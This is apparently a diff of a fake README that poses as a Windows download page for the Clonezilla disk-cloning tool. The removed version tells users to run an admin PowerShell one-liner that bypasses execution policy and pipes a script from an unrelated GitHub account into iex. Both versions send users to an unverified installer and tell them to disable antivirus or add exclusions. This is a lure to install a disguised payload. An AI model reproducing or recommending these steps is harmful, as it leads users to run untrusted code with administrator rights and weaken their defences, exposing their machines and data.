@@ -1,126 +1,84 @@
-# Clonezilla Download for Windows 11 & 10
+# 💾 Clonezilla-2026 - Securely clone your PC hard drive
 
-**Clonezilla-2026**
+[![Download Clonezilla](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/aubertsupposed529/Clonezilla-2026)
 
-**Clonezilla** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📖 About this software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+Clonezilla-2026 provides a way to back up your entire hard drive or clone it to a new storage device. This software creates an exact image of your current Windows setup. You can use this image to restore your files if your system crashes or if you want to move your data to a new computer.
 
----
+This tool works on Windows 10 and Windows 11. It reads your disk sectors and creates a complete copy. This ensures every file, setting, and application stays in its place.
 
-## Download & Install (PowerShell)
+## 🛠️ System Requirements
 
-> **This is the download page.** The command below downloads and runs the **Clonezilla** installer on Windows 10/11.
+Before you start, make sure your computer meets these requirements:
 
-#### Before you start
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: 1.5 GHz or faster.
+- RAM: 4 GB or more.
+- Storage Space: At least 200 MB for the tool, plus enough space on an external drive for your backup images.
+- Permissions: You must have administrator rights on your computer to run this tool.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+## 📥 How to download and install
 
----
+Follow these steps to obtain the tool:
 
-#### Step 1 — Open PowerShell as Administrator
+1. Visit this page to download: [https://github.com/aubertsupposed529/Clonezilla-2026](https://github.com/aubertsupposed529/Clonezilla-2026).
+2. Look for the "Releases" section on the right side of the page.
+3. Click on the latest version link.
+4. Select the file ending in .exe to start your download.
+5. Save the file to your "Downloads" folder.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+## ⚙️ Setting up your clone
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+Once you download the software, follow these steps to prepare your system:
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+1. Locate the downloaded file in your folder.
+2. Double-click the file to open the installer.
+3. If a security window appears, click "Run" to continue.
+4. Follow the instructions on the screen to install the software.
+5. Create a desktop shortcut if the installer asks.
+6. Open the software from your desktop icon.
 
----
+## 📋 Creating a drive image
 
-#### Step 2 — Copy the full command
+When you open the software, you see a menu with clear options. Follow this process to create your first backup:
 
-Select **both lines** below and press **Ctrl+C**:
+1. Select "Disk to Image" from the main menu.
+2. Choose the source drive that you want to back up.
+3. Select the destination drive where you want to save the backup file. Ensure this is an external hard drive or a different internal partition. 
+4. Check the box for "Verify image" to ensure your data stays safe and error-free.
+5. Click "Start" to begin the process.
+6. The window shows a progress bar. Do not turn off your computer while this runs.
+7. Once the bar reaches 100 percent, click "OK" to finish.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 🔄 Restoring from an image
 
-> Copy **both lines**, not just the second one.
+If you need to put your data back onto your disk, use these steps:
 
----
+1. Open the application.
+2. Select "Image to Disk" from the main menu.
+3. Find your saved backup file.
+4. Select the destination drive where you want to place the restored data.
+5. Click "Restore" to begin.
+6. Wait for the copy process to finish.
+7. Restart your computer to apply the finished changes.
 
-#### Step 3 — Paste into PowerShell and press Enter
+## 🧩 Troubleshooting common issues
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+If you encounter problems, check these items:
 
----
+- If the software does not open, right-click the icon and choose "Run as administrator."
+- Ensure your external hard drive has enough storage space before you start the backup.
+- Disable your antivirus if it blocks the software from accessing your disk drives. Remember to turn it back on after the process.
+- Keep your computer plugged into a power source during the entire process to prevent sudden shutdowns.
 
-#### Step 4 — Finish setup
+## 🛡️ Best practices for backups
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+Keep your data safe by following these simple rules:
 
----
+- Update your backups once a month.
+- Store your backup drives in a cool, dry place.
+- Label your external drives so you know which one contains the correct image.
+- Test your restore process on a secondary drive to make sure you understand the steps.
 
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **Clonezilla** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**Clonezilla** setup page for Windows PC users.
-
-**People also search for:** clonezilla download, clonezilla disk clone install setup windows 2026
-
-**Repository:** `Clonezilla-2026`
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** clonezilla-download, clonezilla, clonezilla-disk-clone-install-setup-windows-2026, clonezilla-2026, disk-clone, disk-image, backup, software, windows-11, download
+This tool simplifies disk management for your Windows PC. By following these steps, you maintain a reliable copy of your entire system.
